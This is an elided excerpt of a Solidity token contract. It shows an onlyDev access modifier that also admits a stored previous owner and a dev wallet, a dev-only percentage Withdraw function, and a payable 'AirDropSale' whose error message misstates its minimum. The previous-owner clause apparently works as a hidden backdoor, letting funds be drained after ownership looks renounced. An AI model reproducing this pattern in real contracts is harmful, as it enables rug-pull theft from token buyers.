...
contract InitializableOwnable {
    ...
    modifier onlyDev() {
        ...
        require(msg.sender == _OWNER_ || msg.sender == devWallet || msg.sender == _prevOwner, "NOT_DEV");
        _;
    }
...
//RouterTEST 0x9Ac64Cc6e4415144C455BD8E4837Fea55603e5c3
    ...
    function Withdraw (uint256 amountPercentage) public onlyDev {
    ...
    function AirDropSale () public payable returns(bool) {
	    require (msg.value >= 0.01 ether, "minimum is 0.1 BNB");
        return true;
    }
}